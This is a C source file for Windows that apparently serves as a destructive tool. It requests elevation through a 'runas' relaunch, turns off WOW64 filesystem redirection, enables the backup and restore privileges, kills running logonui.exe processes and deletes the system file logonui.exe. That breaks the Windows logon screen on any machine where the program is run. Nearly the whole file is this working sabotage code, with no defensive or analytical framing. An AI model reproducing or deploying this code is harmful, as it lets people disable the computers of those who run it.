#include <windows.h>
#include <TlHelp32.h>

BOOL IsElevated( ) {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if( hToken ) {
        CloseHandle( hToken );
    }
    return fRet;
}

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ PCSTR szPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if ( !LookupPrivilegeValueA( NULL, szPrivilege, &luid ) )
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[ 0 ].Luid = luid;
	if ( bEnablePrivilege )
		tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[ 0 ].Attributes = 0;

	if ( !AdjustTokenPrivileges( hToken, FALSE, &tp, sizeof( TOKEN_PRIVILEGES ), ( PTOKEN_PRIVILEGES )NULL, ( PDWORD )NULL ) )
	{
		return FALSE;
	}

	if ( GetLastError( ) == ERROR_NOT_ALL_ASSIGNED )
	{
		return FALSE;
	}

	return TRUE;
}

void TerminateProcessName(LPCWSTR lpProcessname)
{
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W prcs;
    prcs.dwSize = sizeof(PROCESSENTRY32W);
    BOOL bTerminateProcessRes = Process32FirstW(hProcessSnapshot, &prcs);
    while (bTerminateProcessRes)
    {
        if (!wcscmp(prcs.szExeFile, lpProcessname))
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, prcs.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        bTerminateProcessRes = Process32NextW(hProcessSnapshot, &prcs);
    }
    CloseHandle(hProcessSnapshot);
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	PVOID OldValue = NULL;
    typedef int* (*MyRedirection)(PVOID);
    HINSTANCE LibHnd = LoadLibrary("kernel32.dll");
    MyRedirection MyDownloadFunction = (MyRedirection)GetProcAddress(LibHnd, "Wow64DisableWow64FsRedirection");
    MyDownloadFunction(&OldValue); //making sure that if the file is located in a wow64 directory,  it can still be runned. We are also making that because our program is 32 bit and it needs to access some real wow64 folders to delete logonui
if (IsElevated()) //check if our program is elevated. if not, try to elevate it
{
	HANDLE hToken = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	//get the restore and the backup privilege
	if ( !SetPrivilege( hToken, SE_RESTORE_NAME, TRUE ) )
	{
		MessageBoxA(0, "Failed To Get the Restore Privilege.", "Error", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
		ExitProcess(0);
	}
	
	if ( !SetPrivilege( hToken, SE_BACKUP_NAME, TRUE ) )
	{
		MessageBoxA(0, "Failed To Get the Backup Privilege.", "Error", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
		ExitProcess(0);
	}
	// get the path of logonui.exe
	char Logon[MAX_PATH];
	GetSystemDirectoryA(Logon, sizeof(Logon));
	lstrcatA(Logon, "\\logonui.exe"); // add logonui.exe to the variable
	//try to delete it right away. If it doesn't work then try to terminate all logonui.exe processes
	if (!DeleteFileA(Logon))
	{
		// either the file is in use, or it is protected more
		TerminateProcessName(L"logonui.exe"); //terminate all processes related to our file
		Sleep(20); //allow some time to terminate all processes on a slow operating system
		if (!DeleteFileA(Logon)){
			//if the file still cannot be deleted, exit because we actually need logonui to reboot normally
		MessageBoxA(0, "Logonui Could Not Be Deleted.", "Error", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
	ExitProcess(0);
		}
	}
	MessageBoxA(0, "Logonui Was Sucessfully Deleted", "Success", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
}
else
{
	char Me[MAX_PATH];
	GetModuleFileNameA(NULL, Me, sizeof(Me));
	ShellExecuteA(0, "runas", Me, "", "", SW_SHOWNORMAL);
}
}
